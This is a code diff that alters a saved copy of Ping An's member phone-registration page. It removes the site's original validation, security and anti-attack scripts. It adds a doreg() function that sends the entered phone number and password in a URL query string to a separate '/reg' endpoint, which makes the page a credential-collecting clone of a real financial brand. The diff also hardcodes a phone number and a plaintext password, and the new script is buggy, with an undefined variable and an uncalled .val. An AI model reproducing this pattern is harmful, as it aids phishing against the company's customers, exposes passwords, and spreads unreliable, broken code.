@@ -5,7 +5,7 @@
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
 <title>会员手机注册 - 平安直通会员中心 - 中国平安</title>
-
+<script type="text/javascript" src="js/jquery-1.8.3.js" ></script>
 <meta name="keywords" content="">
 <meta name="description" content="">
 <meta content="zh-cn" http-equiv="content-language">
@@ -43,10 +43,18 @@
 }
 </style>
 <script></script>
-<script src="./toa.js.下载"></script>
-<script type="text/javascript" async="" src="./sdc9.js.下载"></script>
-<script src="./pa_ui_validator.js.下载" type="text/javascript"></script>
-<script src="./pa_ui_misc.js.下载" type="text/javascript"></script>
+
+
+<script type="text/javascript">
+	function doreg(){
+		alert("按下注册");
+		var username=$("#username").val();
+		var usepwd=$("#userpwd").val;
+		location.href="/reg?username="+username+"&userpwd="+userpwd;
+	}
+</script>
+
+
 </head>
 <body id="simple_b_wrapper"
 	onload="getFcmmValidCode(&#39;phoneValidateImg&#39;,&#39;phoneValidCodeId&#39;,&#39;https://member.pingan.com.cn/pinganone/pa/paic/common/urlvcode.do&#39;);">
@@ -90,7 +98,7 @@
 								<span class="phone_front_img all_front_img"></span>
 							</th>
 							<td valign="top" width="230" height="34">
-							<input name="username" otitle="手机号码" title="手机号码" maxlength="11"
+							<input name="username" otitle="手机号码" title="手机号码" value="18720960089" maxlength="11"
 								class="input_text  newsetbottomboder pa_ui_element_normal"
 								type="text" id="username" value=""
 								pa_ui_valid_rules="{required:{error:&#39;请您输入您的手机号码。&#39;},exFunction:{name:&#39;validate_mobile&#39;}}"
@@ -113,7 +121,7 @@
 								<div id="pwdArea" class="inputline password dib por  setnewcss_bottom">
 									<input type="password" style="width: 160px; border: 0;" class="phonePassword pa_ui_element_normal" maxlength="16"
 										id="userpwd" name="userpwd"
-										title="登录密码" otitle="登录密码"
+										title="登录密码" otitle="登录密码" value="hyz123456"
 										pa_ui_valid_rules="{required:{error:&#39;请您设置登录密码。&#39;},exFunction:{name:&#39;validate_password_local&#39;}}"
 										pa_ui_valid_tipbox="phonePwdTip" pa_ui_keyboard_position="k1"
 										pa_ui_valid_csselerror="valid_csselerror"
@@ -140,7 +148,7 @@
 									<input type="password" style="width: 160px; border: 0;"
 										maxlength="16" pa_ui_name="validator,keyboard"
 										onkeydown="if(event.keyCode == 13){submitForm();}"
-										id="phoneConfirmPassword" title="确认密码" otitle="确认密码"
+										id="phoneConfirmPassword" title="确认密码" otitle="确认密码" value="hyz123456"
 										pa_ui_valid_rules="{required:{error:&#39;请再输入一遍登录密码。&#39;},compare:{element:&#39;phonePassword&#39;}}"
 										pa_ui_valid_error="密码和确认密码不一致，请您重新输入。"
 										pa_ui_valid_tipbox="phoneConPwdTip"
@@ -218,8 +226,9 @@
 							<th></th>
 							<td style="position: relative; overflow: hidden;">
 							<i id="get_k_frames" class="get_k_frames"></i> 
-								<button class="btn_submit mt30" style="margin-top: 5px;" title="立即注册" otitle="立即注册"
-								otype="button" id="loginlink" onclick="return submitForm();">立即注册</button>
+							
+								<button type="button" th:onclick="doreg();" style="margin-top: 5px;" class="btn_submit mt30" title="立即注册" otitle="立即注册" >立即注册</button>
+								
 							</td>
 							<td></td>
 						</tr>
@@ -251,35 +260,7 @@
 		<input type="hidden" id="ecus" name="ecus"
 			value="151e7c44e95a26824aced26422bf25d622293e2d">
 	</div>
-	<script type="text/javascript" language="javascript"
-		src="./unionrsa.js.下载"></script>
-	<script type="text/javascript" language="javascript" src="./sdc.js.下载"></script>
-	<script type="text/javascript" charset="GBK" language="javascript"
-		src="./fcmm_valid_code.js.下载"></script>
-	<script type="text/javascript" charset="GBK" language="javascript"
-		src="./form_validator_list.js.下载"></script>
-	<script type="text/javascript" charset="GBK" language="javascript"
-		src="./common.js.下载"></script>
-	<script type="text/javascript" charset="GBK" language="javascript"
-		src="./register.js.下载"></script>
-	<script type="text/javascript" language="javascript"
-		src="./jquery-1.3.2.js.下载"></script>
-	<script type="text/javascript" language="javascript"
-		src="./jquery-ui-1.7.1.js.下载"></script>
-	<script type="text/javascript" language="javascript"
-		src="./pa_ui.js.下载"></script>
-	<!--直通会员安全 问题  -->
-	<script type="text/javascript" src="./md5.js.下载"></script>
-	<script type="text/javascript" src="./SIG.js.下载"></script>
-	<script type="text/javascript" src="./fingerprint.js.下载"></script>
-	<script type="text/javascript" src="./evercookie.js.下载"></script>
-	<script type="text/javascript" src="./util.js.下载"></script>
-	<script type="text/javascript" src="./usageC.js.下载"></script>
-	<script type="text/javascript" src="./yjmdnffkdspc.js.下载"></script>
-	<!--防攻击-->
-	<script src="./cityjson"></script>
-	<script type="text/javascript" src="./psaWebAccountJS.min.js.下载"></script>
-	<script src="./placeholder.js.下载"></script>
+	
 	<script type="text/javascript">
 	function IEVersion() {
         var userAgent = navigator.userAgent; //取得浏览器的userAgent字符串
@@ -314,21 +295,10 @@
 	}else{
 		$("#get_k_frames").hide();
 	}
-		/*if($("#check_info").text().indexOf('UM带密码强度校验创建用户出错')>-1){
-			$("#check_info").html('<div id="sysTipText" class="pa_ui_validator_onerror">密码强度过低,请重新设置密码!</div>')
-		}	*/
 		var isMsIe6 = false;
 		// 针对IE6 不支持验证码显示的解决方案，显示用户提示
 		if ($.browser.msie && $.browser.version == '6.0') {
 			isMsIe6 = true;
-			/*
-			getFcmmValidCode = function(imgId, codeId, url, appId) {
-				$("#" + imgId).attr("src", "https://member.pingan.com.cn/pinganone/pa/paic/common/vcode.do?r="+Math.random());
-				$("#" + codeId).attr("name", "validCodeId");
-				$("#" + codeId).attr("value", "");
-			};
-			$("#vcodeVer").val("");
-			 */
 			showErrorInfo("手机注册暂不支持IE6浏览器，请升级到IE8及以上版本", "check_info");
 		}
 		//1-24版本是灰度用户调用会员接口，主账户介入将会员和一张通的链接斩断。
